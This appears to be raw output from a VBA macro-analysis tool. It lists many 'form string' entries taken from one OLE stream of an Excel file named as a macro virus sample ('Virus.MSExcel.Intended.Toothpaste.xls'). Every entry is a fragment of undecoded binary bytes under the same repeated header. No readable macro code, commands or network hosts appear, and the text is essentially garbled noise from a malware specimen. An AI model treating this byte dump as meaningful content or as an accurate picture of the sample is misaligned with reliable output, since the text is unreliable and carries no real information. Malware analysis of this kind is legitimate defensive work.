- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���}�����K�F#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KL���(�0X����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lg�Qܑ�X�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3C��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/PR(�V}�&l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e4Dݸɍʚ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Yt̅ı�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z���2fvӫ�;Ÿ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�ք��~#-��Aq��U)}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d�Ώ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E�2��YU���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�bo7��"r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���%YI��*a8��#�Zz	�T�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3c
��F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��m�>�-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
߆�+,#����
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ĵ�r�Ī0Oq�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�;`�iøi�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^Po�b���n��C��2���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*%�ԱE0��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h�\A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x���Q�
b��	䉫KS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e���f��W��&##*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;2��V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ؗ����O�11C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T0яV�K�30?C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Yq�~/�c�[QI~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�xbe&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4OG�pK�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<n8 7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'JePH(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ؤ�S�:.1xH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
׍���x*`/0P/���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��bܤ3?
�c%���C��Tv���c�T�̪��6V65sD�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n,K��!�x�L&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�M]K�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f9:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.U,�.oX��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�G��?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���1d|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
�ǹ��e��7����}&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�R�(�K�i`)�LXC7�0jܵ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^g1e��z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#&c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6Q��] ���Iu�|�Lj,�u)��O�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!Ĥ��3J�⟃�|u�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N.`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y��m2�M���3�t�N��x5���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p0�W-I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�!.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�H���+5WˏF�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<t�8�Ù���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�h^��6��V
p�z�x��T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N6��-@}!��˕�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�̸8�c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B�����!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"����6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Vʔ�>'�[Z���ǯw�����Y��G�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\?J2u`���`���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�ϸ=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pv%���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��̋����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1A qQa��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Je���5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c���tzLCx���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Â��6����/hD����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�Vk��$��kN}�1>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>���"hޒ�/����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B֗�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�����U��`ulD�w���Ĥ�.����6��IM�މ^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*O2�p����V��xh-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�(�A��Lo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�.)N��{ǃTI�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d(�,'จX�&(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x7�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E41��3T12�	�b(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tkbF�่Ae
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sP��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q"�a�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ŗ&!���>e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŗ.�bl��3�p��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1AQa ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/V���m7#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?\i&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{����j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��~7�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�'0y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���T�m~]G�=J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:t�l�`��<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l?#���n�<��z�it�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���<@	��wR�DC�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?'���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I����p��Yat�%�b]î�2}�;!զO��hvp��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8���a��{?Vl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\(6�C�m�j����Mg�-YY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<Sgp��w }��-����4'�n��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g��h��;ԗ�6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2G�Ro
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɧ��JC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xf��<
